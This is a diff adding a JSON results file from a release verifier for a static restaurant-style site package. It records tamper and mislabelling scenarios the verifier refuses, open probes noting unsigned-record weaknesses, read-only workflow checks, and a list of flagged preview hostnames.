+      "ok": true,
+      "detail": "failing: checksums, supply-chain — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-10",
+      "expected": "as stated",
+      "observed": "failing: checksums, supply-chain — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a social image on another host added to a page inside the ZIP",
+      "ok": true,
+      "detail": "failing: checksums, asset-tree, candidate-digest, sbom, external-links, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site.",
+      "rg": "RG-03",
+      "expected": "as stated",
+      "observed": "failing: checksums, asset-tree, candidate-digest, sbom, external-links, social-images — SHA256SUMS.txt lists jade-and-ember-1.0.0-site.zip, release-manifest.json; expected jade-and-ember-1.0.0-site."
+    },
+    {
+      "g": "package",
+      "t": "a good package still verifies 45 days after it was released (freshness is judged at release time, not when it is checked)",
+      "ok": true,
+      "detail": "verified with the clock moved 45 days on",
+      "rg": "RG-02",
+      "expected": "as stated",
+      "observed": "verified with the clock moved 45 days on"
+    },
+    {
+      "g": "package",
+      "t": "the ZIP changed and the manifest's delivered-file part rewritten to match, the digest left: the recomputed digest differs",
+      "ok": true,
+      "detail": "rejected by checksums, candidate-digest, sbom, evidence-recorded: the recomputed digest differs from the one every embedded record names",
+      "expected": "as stated",
+      "observed": "rejected by checksums, candidate-digest, sbom, evidence-recorded: the recomputed digest differs from the one every embedded record names"
+    },
+    {
+      "g": "package",
+      "t": "PROBE (RG-14, open): a changed artifact with every record re-bound to it by whoever can write the repository",
+      "ok": true,
+      "detail": "the verifier PASSED it: consistency and binding are proved, authorship is not (no signature, no independent copy of the hashes; G6-2-DESIGN.md section 12 is the owner's decision)",
+      "probe": true,
+      "finding": "RG-14",
+      "observed": "PASSED: cannot be refused without a signature or an external attestation",
+      "expected": "recorded"
+    },
+    {
+      "g": "channel",
+      "t": "client-style content labelled as a demonstration (demo flag on, noindex on) is refused: its configuration is not a registered demonstration",
+      "ok": true,
+      "detail": "BLOCKED by demonstrationRegistered, demonstrationNoProductionDomain; prepare exit 1; release folder: false",
+      "rg": "RG-13",
+      "expected": "BLOCKED by demonstrationRegistered; nothing prepared",
+      "observed": "BLOCKED by demonstrationRegistered, demonstrationNoProductionDomain; prepare exit 1; release folder: false"
+    },
+    {
+      "g": "channel",
+      "t": "...and it declares a production-looking domain, which a demonstration may not",
+      "ok": true,
+      "detail": "a demonstration declares the production-looking host www.jade-and-ember-fixture.com",
+      "rg": "RG-13",
+      "expected": "as stated",
+      "observed": "a demonstration declares the production-looking host www.jade-and-ember-fixture.com"
+    },
+    {
+      "g": "channel",
+      "t": "the registered fictional demonstration passes the demonstration gate",
+      "ok": true,
+      "detail": "DEMO-JE-001: this configuration is the registered fictional demonstration",
+      "rg": "RG-13",
+      "expected": "as stated",
+      "observed": "DEMO-JE-001: this configuration is the registered fictional demonstration"
+    },
+    {
+      "g": "channel",
+      "t": "...and cannot be released as client-production (the channel comes from the configuration)",
+      "ok": true,
+      "detail": "REFUSED: this build is a demonstration build (configuration: demo true, noindex true); it cannot be released as \"client-production\".",
+      "rg": "RG-13",
+      "expected": "as stated",
+      "observed": "REFUSED: this build is a demonstration build (configuration: demo true, noindex true); it cannot be released as \"client-production\"."
+    },
+    {
+      "g": "channel",
+      "t": "prepare on the registered demonstration writes a package that verifies, with the marker",
+      "ok": true,
+      "detail": "ok files, ok checksums, ok manifest, ok package-binding, ok gate-recorded, ok package-name, ok zip-contents, ok package-extras, ok asset-tree, ok search-digest, ok security, ok candidate-digest, ok records-embedded, ok sbom, ok rules-match-repository, ok verification-record, ok demonstration-pages, ok demonstration-marker, ok channel-text",
+      "rg": "RG-13",
+      "expected": "as stated",
+      "observed": "ok files, ok checksums, ok manifest, ok package-binding, ok gate-recorded, ok package-name, ok zip-contents, ok package-extras, ok asset-tree, ok search-digest, ok security, ok candidate-digest, ok records-embedded, ok sbom, ok rules-match-repository, ok verification-record, ok demonstration-pages, ok demonstration-marker, ok channel-text"
+    },
+    {
+      "g": "channel",
+      "t": "a demonstration package whose manifest drops the marker",
+      "ok": true,
+      "detail": "failing: checksums, demonstration-marker",
+      "rg": "RG-13",
+      "expected": "as stated",
+      "observed": "failing: checksums, demonstration-marker"
+    },
+    {
+      "g": "channel",
+      "t": "a demonstration package registered under an identity that is not in the registry",
+      "ok": true,
+      "detail": "failing: checksums, demonstration-marker",
+      "rg": "RG-13",
+      "expected": "as stated",
+      "observed": "failing: checksums, demonstration-marker"
+    },
+    {
+      "g": "channel",
+      "t": "a demonstration package whose START-HERE.txt does not carry the statement",
+      "ok": true,
+      "detail": "failing: checksums, package-extras, channel-text",
+      "rg": "RG-13",
+      "expected": "as stated",
+      "observed": "failing: checksums, package-extras, channel-text"
+    },
+    {
+      "g": "channel",
+      "t": "a demonstration package that declares a production-looking domain",
+      "ok": true,
+      "detail": "failing: checksums, demonstration-marker",
+      "rg": "RG-13",
+      "expected": "as stated",
+      "observed": "failing: checksums, demonstration-marker"
+    },
+    {
+      "g": "channel",
+      "t": "a demonstration page whose noindex robots tag was removed (client content passed off as the demonstration)",
+      "ok": true,
+      "detail": "failing: checksums, asset-tree, security, candidate-digest, sbom, demonstration-pages",
+      "rg": "RG-13",
+      "expected": "as stated",
+      "observed": "failing: checksums, asset-tree, security, candidate-digest, sbom, demonstration-pages"
+    },
+    {
+      "g": "channel",
+      "t": "a demonstration page that names a production host in a canonical link",
+      "ok": true,
+      "detail": "failing: checksums, asset-tree, candidate-digest, sbom, demonstration-pages",
+      "rg": "RG-13",
+      "expected": "as stated",
+      "observed": "failing: checksums, asset-tree, candidate-digest, sbom, demonstration-pages"
+    },
+    {
+      "g": "deployment",
+      "t": "the workflow is triggered only by push, pull_request and workflow_dispatch",
+      "ok": true,
+      "detail": "push, pull_request, workflow_dispatch",
+      "expected": "holds",
+      "observed": "push, pull_request, workflow_dispatch"
+    },
+    {
+      "g": "deployment",
+      "t": "workflow permissions are read-only (contents: read) at the top and on every job",
+      "ok": true,
+      "detail": "{\"contents\":\"read\"}",
+      "expected": "holds",
+      "observed": "{\"contents\":\"read\"}"
+    },
+    {
+      "g": "deployment",
+      "t": "no job uses an environment, a deployment, a secret or a token",
+      "ok": true,
+      "detail": "no environment:, no secrets., no GITHUB_TOKEN, no id-token",
+      "expected": "holds",
+      "observed": "no environment:, no secrets., no GITHUB_TOKEN, no id-token"
+    },
+    {
+      "g": "deployment",
+      "t": "the only actions are actions/checkout and actions/setup-node, each pinned to a commit",
+      "ok": true,
+      "detail": "actions/checkout, actions/setup-node",
+      "expected": "holds",
+      "observed": "actions/checkout, actions/setup-node"
+    },
+    {
+      "g": "deployment",
+      "t": "no step runs a deploy, publish, push or upload command",
+      "ok": true,
+      "detail": "scanned every run: block and every uses: line",
+      "expected": "holds",
+      "observed": "scanned every run: block and every uses: line"
+    },
+    {
+      "g": "deployment",
+      "t": "no engineering tool or library starts a deploy, upload or network client program",
+      "ok": true,
+      "detail": "105 files scanned",
+      "expected": "holds",
+      "observed": "105 files scanned"
+    },
+    {
+      "g": "deployment",
+      "t": "no engineering code sends a POST, PUT, PATCH or DELETE request",
+      "ok": true,
+      "detail": "none found",
+      "expected": "holds",
+      "observed": "none found"
+    },
+    {
+      "g": "deployment",
+      "t": "code that can open a network connection is only the external-link verifier, the local server and the search probes",
+      "ok": true,
+      "detail": "lib/external.mjs, lib/search.mjs, lib/server.mjs",
+      "expected": "holds",
+      "observed": "lib/external.mjs, lib/search.mjs, lib/server.mjs"
+    },
+    {
+      "g": "deployment",
+      "t": "deploymentApproved is only produced by the gate and printed or recorded, never acted on",
+      "ok": true,
+      "detail": "checks/release.mjs, lib/release.mjs, tools/release.mjs",
+      "expected": "holds",
+      "observed": "checks/release.mjs, lib/release.mjs, tools/release.mjs"
+    },
+    {
+      "g": "deployment",
+      "t": "the policy states that no channel deploys and nothing acts on a deployment approval",
+      "ok": true,
+      "detail": "allows: demonstration: preview-package/host-files; client-production: site-package/host-files",
+      "expected": "holds",
+      "observed": "allows: demonstration: preview-package/host-files; client-production: site-package/host-files"
+    },
+    {
+      "g": "separation",
+      "t": "the real ledger, approval, evidence and deployment records, reviewer table, working tree and release folder are exactly as they were",
+      "ok": true,
+      "expected": "unchanged",
+      "observed": "unchanged"
+    },
+    {
+      "g": "separation",
+      "t": "no synthetic approval, persona or marker appears in any real record",
+      "ok": true,
+      "expected": "none",
+      "observed": "none found"
+    },
+    {
+      "g": "separation",
+      "t": "the real evidence folder holds no records (no physical, screen-reader or browser testing has been recorded)",
+      "ok": true,
+      "expected": "recorded",
+      "observed": "0 record(s) in engineering/release/evidence/",
+      "info": true
+    }
+  ],
+  "probes": [
+    {
+      "id": "RG-02",
+      "t": "no external-link verification of any kind (the verification history emptied, the registry deleted)",
+      "expectation": "blocked by the externalLinks requirement since G6-3 (D-P5-1)",
+      "observed": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run, searchReadiness, externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights",
+      "open": false,
+      "detail": "blocked by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run, searchReadiness, externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights"
+    },
+    {
+      "id": "RG-03",
+      "t": "a rights-verification record while the media inventory lists no image or video as verified",
+      "expectation": "blocked by mediaRightsInventory since G6-3 (D-P5-4): the record is bound to the delivered media and each asset must be verified by an in-force record",
+      "observed": "BLOCKED by mediaRightsInventory, socialImageRights",
+      "open": false,
+      "detail": "blocked by mediaRightsInventory, socialImageRights: 8 problem(s): media/hero-wok.webp is unverified, not verified: no rights-verification record covers its use; media/hero-wok-m.webp is unverified, not verified: no right"
+    },
+    {
+      "id": "RG-08",
+      "t": "a complete, correctly sealed verification record written without running any check (what the sandbox green state is)",
+      "expectation": "only a signature or an attestation can tell it from a real run (design section 7, residual); CI evidence adds a second place to compare",
+      "observed": "ALLOWED",
+      "open": true,
+      "detail": "a record that is complete, bound to this candidate and made against this verification code is accepted; one that is incomplete, hand-edited, stale or for another build is refused (scenarios above)"
+    },
+    {
+      "id": "RG-10",
+      "t": "a dependency advisory that no one has accepted",
+      "expectation": "blocked by dependencySecurity since G6-3 (D-P6-5, D-P6-7)",
+      "observed": "BLOCKED by dependencySecurity",
+      "open": false,
+      "detail": "blocked by dependencySecurity"
+    },
+    {
+      "id": "RG-11",
+      "t": "no SBOM digest, no supported-runtime check: a stale SBOM digest and a workflow whose Actions are no longer pinned",
+      "expectation": "blocked by sbomVerified and supportedRuntimes since G6-3 (D-P6-5)",
+      "observed": "BLOCKED by verifyPassed, evidence:ci-run, sbomVerified, supportedRuntimes",
+      "open": false,
+      "detail": "blocked by verifyPassed, evidence:ci-run, sbomVerified, supportedRuntimes"
+    },
+    {
+      "id": "RG-12",
+      "t": "no real-404 requirement and no HSTS default among the release requirements",
+      "expectation": "blocked once D-P3-1 and D-P3-4 are implemented (G6-4)",
+      "observed": "ALLOWED",
+      "open": true,
+      "detail": "the built site has a 404.html: false; the generated _headers contains includeSubDomains: true; 0 requirement(s) mention them"
+    }
+  ],
+  "hosts": [
+    {
+      "host": "jade.pages.dev",
+      "flagged": true
+    },
+    {
+      "host": "jade.vercel.app",
+      "flagged": true
+    },
+    {
+      "host": "jade.netlify.app",
+      "flagged": true
+    },
+    {
+      "host": "jade.workers.dev",
+      "flagged": true
+    },
+    {
+      "host": "jade.github.io",
+      "flagged": true
+    },
+    {
+      "host": "jade.web.app",
+      "flagged": true
+    },
+    {
+      "host": "jade.onrender.com",
+      "flagged": true
+    },
+    {
+      "host": "jade.fly.dev",
+      "flagged": true
+    },
+    {
+      "host": "staging.jade.com",
+      "flagged": true
+    },
+    {
+      "host": "jade.example.com",
+      "flagged": true
+    },
+    {
+      "host": "jade.test",
+      "flagged": true
+    },
+    {
+      "host": "localhost",
+      "flagged": true
+    },
+    {
+      "host": "10.0.0.5",
+      "flagged": true
+    },
+    {
+      "host": "jade.netlify.com",
+      "flagged": true
+    },
+    {
+      "host": "jade.azurestaticapps.net",
+      "flagged": true
+    },
+    {
+      "host": "jade.cloudfront.net",
+      "flagged": true
+    },
+    {
+      "host": "jade.s3-website-us-east-1.amazonaws.com",
+      "flagged": false
+    },
+    {
+      "host": "jade.appspot.com",
+      "flagged": true
+    },
+    {
+      "host": "jade.repl.co",
+      "flagged": true
+    },
+    {
+      "host": "jade.wixsite.com",
+      "flagged": false
+    },
+    {
+      "host": "jade.webflow.io",
+      "flagged": false
+    },
+    {
+      "host": "jade.framer.website",
+      "flagged": false
+    },
+    {
+      "host": "jade.lovable.app",
+      "flagged": false
+    },
+    {
+      "host": "jade.up.railway.app",
+      "flagged": true
+    },
+    {
+      "host": "jade.deno.dev",
+      "flagged": true
+    },
+    {
+      "host": "jade.pythonanywhere.com",
+      "flagged": true
+    },
+    {
+      "host": "jade-and-ember.com",
+      "flagged": false
+    }
+  ]
+}
